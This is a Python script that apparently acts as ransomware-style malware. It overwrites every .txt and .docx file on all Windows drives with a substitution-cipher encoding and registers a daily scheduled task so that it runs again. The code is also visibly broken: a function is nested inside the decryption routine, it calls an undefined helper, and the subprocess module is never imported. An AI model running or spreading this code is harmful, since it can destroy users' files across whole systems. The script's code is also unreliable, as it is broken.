import os
import pathlib
import schedule
import time
from datetime import datetime
# Encryption map
enc_map = {
    'a': 'fewkj', 'b': 'plsmq', 'c': 'rtznv', 'd': 'krzop', 'e': 'mqlsk',
    'f': 'npwtx', 'g': 'ozurv', 'h': 'ytclp', 'i': 'dkqfb', 'j': 'vwzsn',
    'k': 'zxnlm', 'l': 'bftqy', 'm': 'ghprk', 'n': 'jyxzw', 'o': 'rtcvp',
    'p': 'lfwbq', 'q': 'mnzsy', 'r': 'vxtkl', 's': 'pqrwv', 't': 'kjfnc',
    'u': 'wlxzp', 'v': 'smbtr', 'w': 'nzvpq', 'x': 'lkrcy', 'y': 'bhgqn',
    'z': 'prxjt', 'A': 'FEWKJ', 'B': 'PLSMQ', 'C': 'RTZNV', 'D': 'KRZOP',
    'E': 'MQLSK', 'F': 'NPWTX', 'G': 'OZURV', 'H': 'YTCLP', 'I': 'DKQFB',
    'J': 'VWZSN', 'K': 'ZXNLM', 'L': 'BFTQY', 'M': 'GHPRK', 'N': 'JYXZW',
    'O': 'RTCVP', 'P': 'LFWBQ', 'Q': 'MNZSY', 'R': 'VXTKL', 'S': 'PQRWV',
    'T': 'KJFNC', 'U': 'WLXZP', 'V': 'SMBTR', 'W': 'NZVPQ', 'X': 'LKRCY',
    'Y': 'BHGQN', 'Z': 'PRXJT', '0': 'qlrvx', '1': 'tkbzp', '2': 'xmjwf',
    '3': 'yqcrn', '4': 'vzpts', '5': 'nhwdk', '6': 'mjylz', '7': 'xpvqr',
    '8': 'skfrt', '9': 'bgnzw', '!': 'rj4', '@': 'mq2kz', '#': 'tbyqp',
    '$': 'vnclp', '%': 'zjwrm', '^': 'ykptq', '&': 'wsbrv', '*': 'qzjyn',
    '(': 'xmrkt', ')': 'pkvlr', '-': 'twcpz', '_': 'jnbfr', '=': 'krwtv',
    '+': 'mbqyr', '[': 'ytvnw', ']': 'plzcr', '{': 'rqmvz', '}': 'wkfnt',
    '\\': 'zpykl', '|': 'tvqrw', ';': 'wkrpj', ':': 'bqztm', '\'': 'lvyws',
    '"': 'qkptr', ',': 'nrmjw', '.': 'vkzpy', '/': 'jrwpl', '<': 'qmvby',
    '>': 'ztylw', '?': 'wkxpl', '`': 'njqzw', '~': 'mzpkx', ' ': '-rejv-',
    '\n': 'nwl',  '\t': 'tab'
}

# Decryption map, which is the reverse of enc_map
dec_map = {value: key for key, value in enc_map.items()}

# Encryption function
def enc_text(text):
    enctext = ''
    for char in text:
        enctext += enc_map.get(char, char)  # Get the corresponding encrypted character, or leave it unchanged
    return enctext

# Decryption function
def dec_text(text):
    dectext = ''
    temp = ''
    for char in text:
        temp += char
        if temp in dec_map:  # Check if temp matches a key in dec_map
            dectext += dec_map[temp]  # Append the corresponding character
            temp = ''  # Reset temp after a successful match
    if temp:  # If there are unmatched characters left
        print(f"Warning: Unmatched sequence '{temp}' found.")
    return dectext



def file_encrypt(filepath):
    try:
        with open(filepath, 'r', encoding = 'utf-8', errors = 'ignore') as file:
            content = file.read()
        with open(filepath, 'w', encoding = 'utf-8', errors = 'ignore') as file:
            file.write(enc_text(content))
    except Exception as e:
            print(f"Error encrypting {filepath}: {e}")


def file_decrypt(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
        with open(filepath, 'w', encoding='utf-8', errors='ignore') as file:
            file.write(dec_text(content))
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}")

    def convert_encrypt(doxc_path):
        try:
            txt_path = doxc_path.replace('docx', '.txt')
            os.system(f'pandoc "{doxc_path}" -o "{txt_path}"')   #pandoc converts the file
            file_encrypt(txt_path)
        except Exception as e:
            print(f"Error converting {doxc_path} to txt: {e}")


def scan_and_encrypt():
    drives = [f"{chr(d)}:/" for d in range(65, 91) if os.path.exists(f"{chr(d)}:/")]  #65-91 are the ASCII values for uppercase letters. chr(d) converts the same. After that, we format it
    #as a drive, and then check whether it exists.
    for drive in drives:
        for path in pathlib.Path(drive).rglob('*.txt'):     #scans all directories for .txt files; and iterates over each
            file_encrypt(str(path))  #encrypts
        for path in pathlib.Path(drive).rglob('*.docx'): #does the same for docx
            convert_to_txt_and_encrypt(str(path)) #converts then encrypts

def scan_and_decrypt():
    drives = [f"{chr(d)}:/" for d in range(65, 91) if os.path.exists(f"{chr(d)}:/")]  #Same thing for decryption:
    for drive in drives:
        for path in pathlib.Path(drive).rglob('*.txt'):
            file_decrypt(str(path))

def schedule_task():      #Task scheduler
    task_name = "EncryptFilesTask"   #task name
    script_path = os.path.abspath(__file__)  #Gets the filepath of (__file__) (current one)
    cmd = f'schtasks /create /tn {task_name} /tr "python {script_path}" /sc daily /st 12:00'
    subprocess.run(cmd, shell=True)  #runs python cmd through shell for TS

if __name__ == "__main__":
    choice = input("Do you want to (1) Encrypt/Decrypt manually, (2) Run scheduled encryption, (3) Decrypt all files? ")
    if choice == "1":
        action = input("Encrypt or Decrypt a file? (e/d): ")
        filepath = input("Enter file path: ")
        if action == "e":
            file_encrypt(filepath)
        elif action == "d":
            file_decrypt(filepath)
    elif choice == "2":
        scan_and_encrypt()
    elif choice == "3":
        scan_and_decrypt()
    else:
        print("Invalid choice.")

